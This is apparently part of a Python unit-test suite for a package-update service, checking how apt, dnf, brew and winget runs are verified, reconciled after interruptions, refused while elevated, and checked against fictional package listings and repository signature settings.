        reader = mock.Mock(side_effect=[(0, b"example-tool\tamd64\t1.2.2-1\tii \n"), (0, b""), (3, b"example-tool\tamd64\t1.2.3-1\tii \n"), (0, b"")])
        made.run(made.issue()["ticket_id"], reader=reader, routes=(made.route,))
        self.assertEqual((made.finished[0]["receipt"]["result"], made.finished[0]["receipt"]["verified_postcondition"]), ("could_not_check", False))

    def test_a_record_without_reads_is_no_read(self):
        made = self.real_route("apt", "1.2.3-1")
        made.interrupted(made.issue()["ticket_id"], reader=FakeLauncher(b"example-tool\tamd64\t1.2.2-1\tii \n"), probe=RunProbe())
        (made.service._operation_dir(SESSION, OPERATION) / service_updates.BEFORE_RECORD).unlink()
        made.reconcile(b"example-tool\tamd64\t1.2.3-1\tii \n")
        self.assertEqual((made.finished[0]["receipt"]["result"], made.finished[0]["receipt"]["verified_postcondition"]), ("could_not_check", False))

    def test_a_restart_that_stood_before_the_run_is_replayed_too(self):
        # Reconciliation sees what stood before the run, so it does not credit this step with an older restart.
        files = {"/run/reboot-required": "linux.reboot_required"}
        made = harness(fake_route(restart_files=files))
        made.interrupted(made.issue()["ticket_id"], probe=RunProbe(files={SUDO: regular(), "/run/reboot-required": regular()}))
        saved = json.loads((made.service._operation_dir(SESSION, OPERATION) / service_updates.BEFORE_RECORD).read_text(encoding="utf-8"))
        self.assertEqual(saved["receipt"]["restart_files"], {"/run/reboot-required": True})
        made.reconcile(probe=lambda: RunProbe(files={SUDO: regular(), "/run/reboot-required": regular()}))
        self.assertEqual((made.finished[0]["receipt"]["result"], made.finished[0]["receipt"]["already_pending"]), ("updated", True))
        self.assertNotIn("restart_pending", made.operation)

    def test_a_restart_file_that_cannot_be_read_is_unknown_not_absent(self):
        route = fake_route(restart_files={"/run/reboot-required": "linux.reboot_required"})
        class Refused(RunProbe):
            def lstat(self, path):
                if path == "/run/reboot-required":
                    raise PermissionError(path)
                return super().lstat(path)
        self.assertEqual(service_updates.UpdatesMixin._restart_files(route, Refused()), {"/run/reboot-required": None})
        self.assertEqual(service_updates.UpdatesMixin._restart_files(route, RunProbe()), {"/run/reboot-required": False})
        class NotAFolder(RunProbe):
            def lstat(self, path):
                raise NotADirectoryError(path)
        self.assertEqual(service_updates.UpdatesMixin._restart_files(route, NotAFolder()), {"/run/reboot-required": False})

    def test_an_item_at_its_target_closes_with_no_child_and_no_restart_of_its_own(self):
        held = {"hold": "apt-not-offered", "message": "Not offered", "not_offered": True}
        required = {"restart_probe": "apt.needrestart", "restart": lambda found: "required"}
        made = harness(fake_route(drift=held, **required))
        child = FakeChild()
        result = made.run(made.issue()["ticket_id"], child=child)
        receipt = result["receipt"]
        self.assertEqual((child.calls, made.entered(), made.exit_recorded()), ([], False, False))
        self.assertEqual((result["outcome"], receipt["result"], receipt["verified_postcondition"], receipt["adapter_invoked"], receipt["reason"], receipt["os_consent"]),
                         ("succeeded", "updated", True, False, "already_at_target", "not_applicable"))
        self.assertEqual((receipt["restart"], made.operation.get("restart_pending")), ({"signal": None, "source": None}, None))
        made.service.engine.admit_effect.assert_not_called()
        # What its read says decides: not at the target, or not verified, the hold stands and nothing closes.
        for keywords in ({"result": "did_not_update"}, {"verified": False}):
            with self.subTest(keywords=keywords):
                made = harness(fake_route(drift=held, **keywords))
                child = FakeChild()
                with self.assertRaises(ServiceRefusal) as caught:
                    made.run(made.issue()["ticket_id"], child=child)
                self.assertEqual((caught.exception.code, child.calls, made.finished), ("apt-not-offered", [], []))
        # Any other hold never takes this way out, even with the item at its target.
        made = harness(fake_route(drift={"hold": "package-drift", "message": "Changed", "not_offered": False}))
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(made.issue()["ticket_id"])
        self.assertEqual((caught.exception.code, made.finished), ("package-drift", []))

    def test_a_refused_password_holds_a_repair_and_dnf(self):
        # dpkg --configure -a exits 1 on its own errors, and dnf5's exit 1 cannot be told from sudo's.
        apt, dnf = package_registry.APT["classify_exit"], package_registry.DNF["classify_exit"]
        self.assertEqual(apt(1, ""), "not_started")
        self.assertEqual((apt(100, ""), dnf(1, "")), ("failed", "failed"))
        for name, route, adapter_id in (("repair", fake_route(classify=apt, result="did_not_update"), REPAIR), ("dnf", fake_route(classify=dnf, result="did_not_update"), UPGRADE)):
            with self.subTest(route=name):
                made = harness(route, adapter_id=adapter_id)
                made.run(made.issue()["ticket_id"], child=FakeChild(code=1))
                self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("failed", "could_not_check"))

    def test_a_missing_or_false_postcondition_is_never_updated(self):
        for name, made in self.paths({"verified": False}).items():
            with self.subTest(path=name):
                receipt = made.finished[-1]["receipt"]
                self.assertEqual((made.finished[-1]["outcome"], receipt["result"], receipt["verified_postcondition"]), ("failed", "could_not_check", False))
                self.assertEqual(receipt["category"], "needs_check")
                self.assertEqual((receipt["actual_effects_recorded"], receipt["no_active_effects"]), (False, True))

    def test_a_route_without_a_postcondition_field_holds_too(self):
        route = fake_route()
        unset = MappingProxyType({**route, "verify": lambda payload, reads: {"result": "updated", "installed_version": "1.0.0"}})
        made = harness(unset)
        made.run(made.issue()["ticket_id"])
        self.assertEqual(made.finished[0]["receipt"]["result"], "could_not_check")

    def test_a_child_that_never_started_is_never_updated(self):
        made = harness()
        made.run(made.issue()["ticket_id"], child=FakeChild(error=FileNotFoundError("missing")))
        receipt = made.finished[0]["receipt"]
        self.assertEqual((made.finished[0]["outcome"], receipt["result"], receipt["adapter_invoked"]), ("failed", "could_not_check", False))
        self.assertTrue(made.exit_recorded())

    def test_a_recorded_boot_is_reused_and_a_gone_signal_reads_as_none(self):
        # The boot is recorded, the check was interrupted: no new reading, the same evidence goes to the engine.
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        ticket = made.issue()["ticket_id"]
        made.run(ticket)
        made.operation["restart_verification"] = {"boot_observed": True, "evidence_id": "boot-evidence", "sha256": "c" * 64, "recorded_utc": utc_now()}
        child = FakeChild()
        made.run(ticket, child=child, probe=RunProbe())
        made.service.engine.record_boot_observation.assert_called_once_with(SESSION, operation_id=OPERATION, evidence_id="boot-evidence")
        receipt = made.finished[0]["receipt"]
        self.assertEqual((child.calls, receipt["after_restart"], receipt["boot_evidence_id"], receipt["result"]), ([], True, "boot-evidence", "updated"))
        self.assertEqual(receipt["restart"], {"signal": "required", "source": "apt.needrestart"})
        # Reconciliation recognises the same state.
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        made.run(made.issue()["ticket_id"])
        made.operation["restart_verification"] = {"boot_observed": True, "evidence_id": "boot-evidence", "sha256": "c" * 64, "recorded_utc": utc_now()}
        made.reconcile()
        self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("succeeded", "updated"))
        # Without a boot it still waits.
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        made.run(made.issue()["ticket_id"])
        with self.assertRaises(ServiceRefusal) as caught:
            made.reconcile()
        self.assertEqual(caught.exception.code, "package-restart-class")
        # The signal read again as "none": no boot is demanded; the ticket is used and reconciliation closes it.
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        ticket = made.issue()["ticket_id"]
        made.run(ticket)
        made.operation["restart_pending"] = {"signal": "none", "source": "apt.needrestart"}
        made.route = fake_route(restart_probe="apt.needrestart", restart=lambda found: "none")
        with self.assertRaises(ServiceRefusal) as caught:
            made.run(ticket, probe=RunProbe())
        self.assertEqual(caught.exception.code, "package-ticket-used")
        made.reconcile()
        self.assertEqual((made.finished[0]["outcome"], made.finished[0]["receipt"]["result"]), ("succeeded", "updated"))

    def test_the_boot_the_step_ran_in_is_named(self):
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        made.run(made.issue()["ticket_id"], probe=RunProbe(boot={"last_boot_utc": utc_now(), "boot_id": "boot-1"}))
        self.assertEqual([row["facts"].get("boot_id") for row in made.registered if "restart_signal" in row["facts"]], ["boot-1"])
        made = harness(fake_route(restart_probe="apt.needrestart", restart=lambda found: "required"))
        made.run(made.issue()["ticket_id"])
        self.assertEqual([row["facts"].get("boot_id") for row in made.registered if "restart_signal" in row["facts"]], [None])


@refusals_fail
class ElevationTests(unittest.TestCase):
    def test_run_ticket_refuses_while_elevated(self):
        for answer in (True, None):
            with self.subTest(answer=answer):
                made = harness()
                ticket = made.issue()["ticket_id"]
                made.service.elevation_probe = lambda answer=answer: answer
                child = FakeChild()
                with self.assertRaises(ServiceRefusal) as caught:
                    made.run(ticket, child=child)
                self.assertEqual((caught.exception.code, child.calls), ("package-elevated", []))

    def test_paused_or_stopped_session_closes_the_ticket_as_not_run(self):
        for status in ("paused", "pause_pending", "stopped"):
            with self.subTest(status=status):
                made = harness()
                ticket = made.issue()["ticket_id"]
                made.state["status"] = status
                child = FakeChild()
                made.run(ticket, child=child)
                receipt = made.finished[0]["receipt"]
                self.assertEqual((child.calls, made.entered(), made.finished[0]["outcome"]), ([], False, "failed"))
                self.assertEqual((receipt["adapter_invoked"], receipt["result"], receipt["verified_postcondition"]), (False, "not_run", False))

    def test_run_ticket_reads_state_and_binding_under_the_lock_before_the_effect(self):
        made = harness()
        ticket = made.issue()["ticket_id"]
        order = []
        service = made.service
        real_lock, real_state, real_binding, real_effect = service._lock, service._state, service._binding, service._run_effect
        def lock():
            order.append("lock")
            return real_lock()
        service._lock = lock
        service._state = mock.Mock(side_effect=lambda *a, **k: (order.append("state"), real_state(*a, **k))[1])
        service._binding = mock.Mock(side_effect=lambda *a, **k: (order.append("binding"), real_binding(*a, **k))[1])
        def effect(*args, **keywords):
            try:
                with real_lock():
                    order.append("effect-without-lock")
            except ServiceRefusal:
                order.append("effect")
            return real_effect(*args, **keywords)
        service._run_effect = mock.Mock(side_effect=effect)
        made.run(ticket)
        self.assertEqual(order, ["lock", "state", "binding", "effect"])
        with real_lock():  # released when the run ended
            pass


class ChildTests(unittest.TestCase):
    """_start_child itself: what a person's Ctrl-C and a descendant holding the pipe do to the parent's wait."""

    def popen(self, wait, stdout=None):
        """A subprocess.Popen stand-in whose wait() runs ``wait`` and whose output is ``stdout``."""
        class Popen:
            def __init__(self, argv, **keywords):
                self.stdout = stdout

            def wait(self, timeout=None):
                return wait()
        return mock.patch.object(service_updates.subprocess, "Popen", Popen)

    def start(self, terminal):
        return service_updates._start_child(("/usr/bin/sudo", "x"), env=dict(FAKE_ENV), cwd="/", terminal=terminal)

    def test_the_parent_ignores_a_ctrl_c_while_it_waits_in_both_branches(self):
        first = [signal.getsignal(number) for number in service_updates.INTERRUPTS]
        self.assertIn(signal.SIGINT, service_updates.INTERRUPTS)
        for terminal in (True, False):
            with self.subTest(terminal=terminal):
                seen = []
                def wait():
                    seen.extend(signal.getsignal(number) for number in service_updates.INTERRUPTS)
                    signal.raise_signal(signal.SIGINT)  # the terminal delivers it to the parent too
                    return 1
                try:
                    with self.popen(wait, io.BytesIO(b"tail")):
                        self.assertEqual(self.start(terminal)[0], 1)
                except KeyboardInterrupt:
                    self.fail("the parent died with its child, so no exit would be recorded")
                self.assertEqual(seen, [signal.SIG_IGN] * len(first))
                self.assertEqual([signal.getsignal(number) for number in service_updates.INTERRUPTS], first, "restored")

    def test_the_handlers_come_back_when_the_wait_raises(self):
        first = [signal.getsignal(number) for number in service_updates.INTERRUPTS]
        def wait():
            raise OSError("no such child")
        with self.popen(wait), self.assertRaises(OSError):
            self.start(True)
        self.assertEqual([signal.getsignal(number) for number in service_updates.INTERRUPTS], first)

    def test_only_the_main_thread_touches_the_handlers(self):
        found, changed = [], mock.Mock()
        with self.popen(lambda: 7), mock.patch.object(service_updates.signal, "signal", changed):
            worker = threading.Thread(target=lambda: found.append(self.start(True)))
            worker.start()
            worker.join(30)
        self.assertEqual((found, changed.called), ([(7, b"")], False))

    def test_a_descendant_holding_the_pipe_cannot_delay_the_exit(self):
        # The direct child ended; something it left behind keeps its output open. Its exit counts now, with the output so far.
        release = threading.Event()
        class Held:
            chunks, closed = [b"last words"], False

            def read1(self, size):
                if self.chunks:
                    return self.chunks.pop()
                release.wait(30)
                return b""

            def close(self):
                self.closed = True
        held = Held()
        started = time.monotonic()
        with self.popen(lambda: 7, held), mock.patch.object(service_updates, "PIPE_WAIT_SECONDS", 0.2):
            self.assertEqual(self.start(False), (7, b"last words"))
        self.assertLess(time.monotonic() - started, 10)
        self.assertFalse(held.closed, "the pipe a descendant still holds is left alone")
        release.set()

    def test_the_output_is_kept_to_its_last_bytes_and_closed(self):
        class Pipe(io.BytesIO):
            def read1(self, size=-1):
                return super().read(min(size, 1000))
        pipe = Pipe(b"x" * 70000 + b"end")
        with self.popen(lambda: 0, pipe):
            code, tail = self.start(False)
        self.assertEqual((code, len(tail), tail[-3:], pipe.closed), (0, service_updates.TAIL_BYTES, b"end", True))

    @unittest.skipUnless(hasattr(os, "forkpty"), "only on posix: a pseudo-terminal needs forkpty")
    def test_ctrl_c_in_a_real_terminal_still_returns_the_childs_exit(self):
        # A real pseudo-terminal: Ctrl-C reaches the whole foreground group, as at sudo's password prompt. The one child is this interpreter.
        code = "import sys, time; print('waiting', flush=True); time.sleep(30)"
        pid, master = os.forkpty()
        if pid == 0:  # the fixture parent, on its own terminal
            try:
                exit_code = service_updates._start_child((sys.executable, "-I", "-S", "-c", code), env=dict(os.environ), cwd="/", terminal=True)[0]
                os.write(1, f"exit={exit_code}\n".encode())
            finally:
                os._exit(0)
        try:
            text, sent, deadline = b"", False, time.monotonic() + 30
            while b"exit=" not in text and time.monotonic() < deadline:
                if select.select([master], [], [], 0.5)[0]:
                    try:
                        chunk = os.read(master, 4096)
                    except OSError:
                        break  # the terminal closed: the fixture parent is gone
                    text += chunk
                    if b"waiting" in text and not sent:
                        os.write(master, b"\x03")
                        sent = True
            self.assertTrue(sent, text)
            self.assertIn(b"exit=", text, "the parent died with its child, so no exit would have been recorded")
        finally:
            try:
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass
            os.waitpid(pid, 0)
            os.close(master)


@refusals_fail
class AptRouteFlowTests(unittest.TestCase):
    """The real apt route's hooks over fictional output."""

    def preflight(self, name="examplesecure", operation="upgrade", *, installed=None, upgrades=None, simulated=None, reinstall=None):
        """The real route's preflight of one item over fictional output."""
        lines = [line + "\n" for line in fixture("apt-upgrades.txt").decode().splitlines() if line.startswith(("Inst " + name + " ", "Conf " + name + " "))]
        run = ManagerRun({**SETTLED_APT, "apt.installed": installed or fixture("dpkg-installed.txt") + b"examplesecure\tamd64\t1.0-1\tii \n",
                          "apt.upgrades": fixture("apt-upgrades.txt") if upgrades is None else upgrades, "apt.simulate": simulated or "".join(lines).encode(),
                          "apt.simulate_reinstall": reinstall or b""}, folders=APT_FOLDERS)
        return package_registry.APT["run"]["preflight"](FakeProbe(), run, {"id": name}, operation)

    def test_a_version_in_two_suites_reads_into_one_payload(self):
        # apt prints every suite of a version joined by ", ", as Ubuntu does for security updates. The payload names the first; the
        # whole origin stays bound through sim_sha256.
        candidate = self.preflight()
        self.assertEqual((candidate["source"], candidate["version"]), ("example-updates", "1.0-2"))
        self.assertIn(b"example-security", b"".join(line for line in fixture("apt-upgrades.txt").splitlines() if b"examplesecure [" in line))
        fragment = package_registry.APT["plan"](candidate, {"operation": "upgrade", "executable": {"kind": "system", "path": SUDO, "identity": {"real_path": SUDO}},
                                                            "agreements": []})
        self.assertIs(engine_updates.read_package(body := package_registry.payload(fragment, environment=FAKE_ENV)), body)
        for origin, source in (("Example:24.04/example-updates", "example-updates"), ("Example:24.04/a, Example:24.04/b", "a"), ("Example Label:1.0/our suite", "apt"),
                               ("noslash", "noslash"), ("Example:1.0/-dash", "apt"), ("Example:1.0/a:~b", "apt"), ("", "apt")):
            with self.subTest(origin=origin):
                self.assertEqual(apt.apt_source(origin), source)

    def test_kept_back_packages_are_reported_left_out(self):
        # Discovery must not stay silent about what apt holds back. The fixture's kernel is kept back and is no candidate.
        listed = package_registry.APT["discover"](FakeProbe(), ManagerRun({**SETTLED_APT, "apt.installed": fixture("dpkg-installed.txt"),
                                                                           "apt.upgrades": fixture("apt-upgrades.txt"), "apt.simulate": b""}, folders=APT_FOLDERS))
        self.assertIn({"name": "examplekernel", "reason": "kept_back"}, listed["left_out"])
        self.assertNotIn("examplekernel", [row["id"] for row in listed["candidates"]])

    def test_an_interrupted_dpkg_holds_before_the_real_run_would_fail(self):
        # apt-get -s takes no lock, so it never says dpkg was interrupted; only the status column shows it.
        for status in ("iF ", "iU ", "it ", "iW ", "iHR", "iiR"):
            broken = fixture("dpkg-installed.txt") + b"examplesecure\tamd64\t1.0-1\tii \nexamplebroken\tamd64\t1.0\t" + status.encode() + b"\n"
            with self.subTest(status=status):
                holds(self, "apt-unsettled", self.preflight, installed=broken)
                holds(self, "apt-unsettled", self.preflight, "examplecurl", "reinstall", installed=broken)
        settled = fixture("dpkg-installed.txt") + b"examplesecure\tamd64\t1.0-1\tii \noldtool\tamd64\t0.9\trc \ngonetool\tamd64\t\tun \n"
        self.assertEqual(self.preflight(installed=settled)["version"], "1.0-2")

    def test_reinstall_binds_where_the_bytes_come_from_and_can_mend_its_own_package(self):
        listing = b"Inst examplecurl [8.5.0-2example1] (8.5.0-2example1 Example:24.04/example-security, Example:24.04/example-updates [amd64])\n"
        for status in ("ii ", "iiR"):
            installed = f"examplecurl\tamd64\t8.5.0-2example1\t{status}\n".encode()
            with self.subTest(status=status):
                candidate = self.preflight("examplecurl", "reinstall", installed=installed, upgrades=b"", reinstall=listing)
                self.assertEqual((candidate["source"], candidate["preflight"]["arch"], candidate["version"]), ("example-security", "amd64", "8.5.0-2example1"))
        holds(self, "apt-unsettled", self.preflight, "examplecurl", "reinstall", installed=b"examplecurl\tamd64\t8.5.0-2example1\tiiR\nother\tamd64\t1.0\tiiR\n",
              upgrades=b"", reinstall=listing)
        # A half-configured package is not reinstalled: only the error flag is the reinstall's to mend.
        holds(self, "apt-reinstall", self.preflight, "examplecurl", "reinstall", installed=b"examplecurl\tamd64\t8.5.0-2example1\tiF \n", upgrades=b"", reinstall=listing)

    def test_every_dependency_keeps_its_architecture_and_a_new_package_is_flagged(self):
        simulated = (f"Inst examplecurl [8.5.0-2example1] (8.5.0-2example2 {ORIGIN} [amd64])\nInst libnew:arm64 (2.0-1 {ORIGIN} [arm64])\n"
                     f"Inst libexample1 [2.1-1] (2.1-2 {ORIGIN} [amd64])\n").encode()
        candidate = self.preflight("examplecurl", simulated=simulated)
        self.assertEqual(candidate["dependencies"], ["libexample1:amd64@2.1-2", "libnew:arm64@2.0-1"])
        self.assertEqual(candidate["flags"], ["adds_packages"])
        self.assertEqual(self.preflight("examplecurl", simulated=f"Inst examplecurl [8.5.0-2example1] (8.5.0-2example2 {ORIGIN} [amd64])\n".encode())["flags"], [])


@refusals_fail
class DnfRouteFlowTests(unittest.TestCase):
    """The real dnf5 route's hooks over fictional output."""

    def reinstall(self, preview=None, config=None, **more):
        """The real route's reinstall preflight of the fixture's one exampletool, over fictional output."""
        run = ManagerRun({"dnf.upgrades": b"", "dnf.all_installed": fixture("rpm-installed.txt"), "dnf.version": fixture("dnf-version.txt"),
                          "dnf.preview_reinstall": preview or fixture("dnf-preview-reinstall.txt"), "dnf.repo_config": config or fixture("dnf-repo-config.txt")}, **more)
        return package_registry.DNF["run"]["preflight"](FakeProbe(), run, {"id": "exampletool"}, "reinstall")

    def test_reinstall_reads_its_preview_and_the_repository_that_supplies_it(self):
        candidate = self.reinstall()
        self.assertEqual((candidate["version"], candidate["source"], candidate["preflight"]["gpgcheck"]), ("exampletool-0:8.9.1-2.fc41.x86_64", "updates", {"updates": True}))
        self.assertEqual(candidate["preflight"]["preview_sha256"], routes.dnf_preview(fixture("dnf-preview-reinstall.txt"))["sha256"])
        holds(self, "dnf-gpgcheck", self.reinstall, config=b"[updates]\npkg_gpgcheck = 0\n")
        holds(self, "dnf-gpgcheck", self.reinstall, config=b"[updates]\nname = x\n")
        for name, text in (("another version", fixture("dnf-preview-reinstall.txt").replace(b"exampletool              x86_64  8.9.1-2", b"exampletool              x86_64  8.9.1-9")),
                           ("another package", fixture("dnf-preview-reinstall.txt") .replace(b"Transaction Summary", b" exampleother x86_64 1.0 updates 1 KiB\n\nTransaction Summary").replace(b"\n\n exampleother", b"\n exampleother")),
                           ("another section", fixture("dnf-preview-reinstall.txt").replace(b"Reinstalling:\n ", b"Upgrading:\n ", 1)),
                           ("an obsoleted package", fixture("dnf-preview-reinstall.txt").replace(b"replacing exampletool", b"replacing exampleold ")),
                           ("another architecture", fixture("dnf-preview-reinstall.txt").replace(b"exampletool              x86_64", b"exampletool              i686  "))):
            with self.subTest(preview=name):
                holds(self, "dnf-preview-item", self.reinstall, preview=text)
        holds(self, "dnf-preview", self.reinstall, preview=b"No match for argument\n")
        holds(self, "dnf-preview", self.reinstall, failed=("dnf.preview_reinstall",))
        holds(self, "dnf-repo-config", self.reinstall, failed=("dnf.repo_config",))

    def upgrade(self, host, name):
        return package_registry.DNF["run"]["preflight"](host.probe(), lambda recipe_id, values=None: self.read(host, recipe_id, values), {"id": name}, "upgrade")

    @staticmethod
    def read(host, recipe_id, values):
        """One read of ``host`` through the real runner, as the service's run function makes it."""
        return readonly_runner.run_recipe(recipe_id, values, launcher=host.read, probe=host.probe())

    def test_every_previewed_repository_is_read_and_checked(self):
        offers = {"exampletool": ("1.0-1", "1.0-2"), "exampledep": (None, "2.0-1")}
        candidate = self.upgrade(FakeHost("dnf", offers, {"exampletool": ["exampledep"]}, {"exampledep": "fedora"}), "exampletool")
        self.assertEqual(candidate["preflight"]["gpgcheck"], {"fedora": True, "updates": True})
        self.assertEqual((candidate["dependencies"], candidate["flags"]), (["exampledep.x86_64@2.0-1/fedora"], ["adds_packages"]))
        holds(self, "dnf-gpgcheck", self.upgrade, FakeHost("dnf", offers, {"exampletool": ["exampledep"]}, {"exampledep": "unsigned"}), "exampletool")
        self.assertEqual(self.upgrade(FakeHost("dnf", {"exampletool": offers["exampletool"]}), "exampletool")["flags"], [])

    def preview_run(self, preview):
        """The run function over the fixture computer, with ``preview`` as what an upgrade of exampletool would do."""
        return ManagerRun({"dnf.upgrades": fixture("dnf-upgrades.txt"), "dnf.all_installed": fixture("rpm-installed.txt"), "dnf.version": fixture("dnf-version.txt"),
                           "dnf.preview": preview, "dnf.repo_config": fixture("dnf-repo-config.txt")})

    def test_collateral_is_bound_whole_and_a_shrink_may_not_hide_another_architecture(self):
        route, preview = package_registry.DNF, fixture("dnf-preview.txt")
        lib = b" examplelib               x86_64  1:2.1-2.fc41     updates     10.0 KiB\n   replacing examplelib   x86_64  1:2.1-1.fc41     updates     10.0 KiB\n"
        dep = b" exampledep               x86_64  1:1.0-1.fc41     updates      5.0 KiB\n"
        self.assertTrue(lib in preview and dep in preview)
        approved = preview.replace(dep, dep.replace(b"updates", b"fedora "))  # the dependency from another signed repository
        candidate = route["run"]["preflight"](FakeProbe(), self.preview_run(approved), {"id": "exampletool"}, "upgrade")
        self.assertEqual(candidate["dependencies"], ["exampledep.x86_64@1:1.0-1.fc41/fedora", "examplelib.x86_64@1:2.1-2.fc41/updates"])
        payload = {**candidate, "operation": "upgrade"}
        # An earlier item brought exampledep in: the list shrinks, and only then may the preview hash and its repositories differ.
        shrunk = approved.replace(dep.replace(b"updates", b"fedora "), b"")
        self.assertIsNone(route["drift"](FakeProbe(), self.preview_run(shrunk), payload))
        # The same shrink while examplelib comes for another architecture, next to the installed one, or from another repository:
        # what is left is not a part of the approved rows.
        for name, text, rows in (("another architecture", shrunk.replace(lib, b"").replace(
                                      b"Installing dependencies:\n", b"Installing dependencies:\n examplelib i686 1:2.1-2.fc41 updates 10.0 KiB\n"),
                                  ["examplelib.i686@1:2.1-2.fc41/updates"]),
                                 ("another repository", shrunk.replace(lib, lib.replace(b"1:2.1-2.fc41     updates", b"1:2.1-2.fc41     fedora ")),
                                  ["examplelib.x86_64@1:2.1-2.fc41/fedora"])):
            with self.subTest(change=name):
                self.assertEqual(route["run"]["preflight"](FakeProbe(), self.preview_run(text), {"id": "exampletool"}, "upgrade")["dependencies"], rows)
                self.assertEqual(route["drift"](FakeProbe(), self.preview_run(text), payload)["hold"], "package-drift")

    def test_the_check_after_the_run_reads_each_planned_package_by_architecture_and_version(self):
        target = "exampletool-0:8.9.1-3.fc41.x86_64"
        payload = {"id": "exampletool", "version": target, "operation": "upgrade", "preflight": {"arch": "x86_64"},
                   "dependencies": ["examplelib.x86_64@1:2.1-2.fc41/updates"]}
        before = b"exampletool 0:8.9.1-2.fc41.x86_64\nexamplelib 1:2.1-1.fc41.x86_64\n"
        verify = lambda after: package_registry.DNF["verify"](payload, {when: {"dnf.all_installed": {"ok": True, "exit_code": 0, "stdout": data}}
                                                                        for when, data in (("before", before), ("after", after))})
        found = verify(b"exampletool 0:8.9.1-3.fc41.x86_64\nexamplelib 1:2.1-2.fc41.x86_64\n")
        self.assertEqual((found["result"], found["verified_postcondition"], found["facts"]["changed_outside_plan"]), ("updated", True, []))
        # The approved x86_64 library never moved; the same version came for i686 beside it. Nothing of that is the plan.
        found = verify(b"exampletool 0:8.9.1-3.fc41.x86_64\nexamplelib 1:2.1-1.fc41.x86_64\nexamplelib 1:2.1-2.fc41.i686\n")
        self.assertEqual((found["result"], found["verified_postcondition"], found["facts"]["changed_outside_plan"]),
                         ("differs_from_plan", False, ["examplelib.i686"]))
        # Moved, but not to the bound version.
        found = verify(b"exampletool 0:8.9.1-3.fc41.x86_64\nexamplelib 1:2.1-3.fc41.x86_64\n")
        self.assertEqual((found["result"], found["verified_postcondition"]), ("updated", False))
        for wrong in (["examplelib@1:2.1-2.fc41"], ["examplelib.x86_64"]):  # a dependency that is not a whole row proves nothing
            with self.subTest(dependencies=wrong):
                found = package_registry.DNF["verify"]({**payload, "dependencies": wrong}, {"before": {"dnf.all_installed": {"ok": True, "stdout": before}},
                                                                                           "after": {"dnf.all_installed": {"ok": True, "stdout": before}}})
                self.assertEqual((found["result"], found["verified_postcondition"]), ("could_not_check", False))

    def test_a_package_of_two_architectures_says_so(self):
        two = b"glibc-0:2.40-2.fc41.x86_64 updates\nglibc-0:2.40-2.fc41.i686 updates\n"
        run = ManagerRun({"dnf.upgrades": two, "dnf.all_installed": fixture("rpm-installed.txt"), "dnf.version": fixture("dnf-version.txt")})
        holds(self, "dnf-two-architectures", package_registry.DNF["run"]["preflight"], FakeProbe(), run, {"id": "glibc"}, "upgrade")
        holds(self, "dnf-not-offered", package_registry.DNF["run"]["preflight"], FakeProbe(), run, {"id": "other"}, "upgrade")


@refusals_fail
class RegistryFlowTests(unittest.TestCase):
    """The registry's shared rules, across the real routes."""

    def test_a_failed_or_missing_read_never_gives_a_postcondition(self):
        # The manager's listing is parseable and shows the target, but its command exited with a code the recipe does not expect.
        brew = lambda version: json.dumps({"formulae": [{"name": "example-tool", "tap": "homebrew/core", "installed": [{"version": version}]}], "casks": []}).encode()
        rpm = lambda version: f"example-tool 0:{version}.x86_64\n".encode()
        line = "example-tool\tamd64\t{}\tii \n"
        cases = {"winget": ("winget.installed", b"", fixture("winget-installed-after.txt"), {"id": "Contoso.NoteTaker", "version": "3.4.1"}),
                 "brew": ("brew.info", brew("1.0"), brew("2.0"), {"id": "example-tool", "version": "2.0", "preflight": {"kind": "formula"}}),
                 "apt": ("apt.installed", line.format("1.0-1").encode(), line.format("2.0-1").encode(), {"id": "example-tool", "version": "2.0-1"}),
                 "dnf": ("dnf.all_installed", rpm("1.0-1.fc41"), rpm("2.0-1.fc41"), {"id": "example-tool", "version": "example-tool-0:2.0-1.fc41.x86_64"})}
        self.assertEqual(sorted(cases), sorted(routes.MANAGERS))
        for manager, (recipe, before, after, fields) in cases.items():
            verify = package_registry.DESCRIPTORS[manager]["verify"]
            payload = {"operation": "upgrade", "dependencies": [], "preflight": {}, **fields}
            good = lambda stdout: {"ok": True, "exit_code": 0, "stdout": stdout}
            bad = lambda stdout: {"ok": False, "exit_code": 3, "stdout": stdout}
            self.assertEqual(verify(payload, {"before": {recipe: good(before)}, "after": {recipe: good(after)}})["result"], "updated", manager)
            reads = {"failed read after": {"before": {recipe: good(before)}, "after": {recipe: bad(after)}}, "no read after": {"before": {recipe: good(before)}, "after": {}}}
            if manager != "winget":  # winget reads only after the run
                reads.update({"failed read before": {"before": {recipe: bad(before)}, "after": {recipe: good(after)}},
                              "no read before": {"before": {}, "after": {recipe: good(after)}}})
            for name, found in reads.items():
                with self.subTest(manager=manager, case=name):
                    checked = verify(payload, found)
                    self.assertEqual((checked["result"], checked["verified_postcondition"]), ("could_not_check", False))
                    self.assertEqual(package_registry.route_result({"run_kind": "terminal"}, {"class": "success"}, checked),
                                     {"result": "could_not_check", "verified_postcondition": False})

    def test_the_route_selects_the_recipe_and_run_kind_of_each_operation(self):
        for manager, operation, kind, recipe in (("apt", "upgrade", None, "apt.upgrade"), ("apt", "reinstall", None, "apt.reinstall"), ("apt", "repair", None, "apt.configure"),
                                                 ("dnf", "upgrade", None, "dnf.upgrade"), ("dnf", "reinstall", None, "dnf.reinstall"),
                                                 ("brew", "upgrade", "cask", "brew.upgrade_cask"), ("brew", "reinstall", "formula", "brew.reinstall_formula"),
                                                 ("winget", "upgrade", None, "winget.upgrade")):
            route = package_registry.DESCRIPTORS[manager]
            record = {"operation": operation, "recipe": recipe, "run_kind": route["run_kind"], "preflight": {"kind": kind}}
            with self.subTest(manager=manager, operation=operation):
                self.assertIsNone(package_registry.check_selection(route, record))
                for wrong in ({"recipe": "apt.configure" if recipe != "apt.configure" else "apt.upgrade"}, {"run_kind": "settings"}, {"operation": "firmware_update"}):
                    holds(self, "package-recipe", package_registry.check_selection, route, {**record, **wrong})
